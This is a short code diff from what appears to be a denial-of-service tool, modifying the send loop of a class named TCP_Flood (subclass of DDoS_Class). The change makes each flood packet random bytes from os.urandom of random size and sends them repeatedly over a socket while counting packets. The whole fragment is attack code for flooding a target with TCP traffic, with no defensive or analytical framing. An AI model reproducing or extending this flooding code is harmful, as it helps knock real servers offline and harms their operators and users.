@@ -68,15 +68,18 @@ class TCP_Flood(DDoS_Class):
                             break
                         if self.stop == True:
                             break
-                        m = ""
-                        for li in range(
+                        m = os.urandom(random.randint(self.min_size, self.max_size))
+                        """for li in range(
                             random.randint(self.min_size, self.max_size)
                         ):  # each payload' size is chosen randomly between maximum and minimum values
-                            m += random.choice(Common_Variables.source_string)
+                            m += random.choice(Common_Variables.source_string)"""
+                        
                         try:
                             if self.stop == True:
                                 break
-                            s.send(m.encode("utf-8"))
+                            if type(m)==str:
+                                m=m.encode()
+                            s.send(m)
                             self.counter += 1
                             if self.logs == True:
                                 sys.stdout.write(
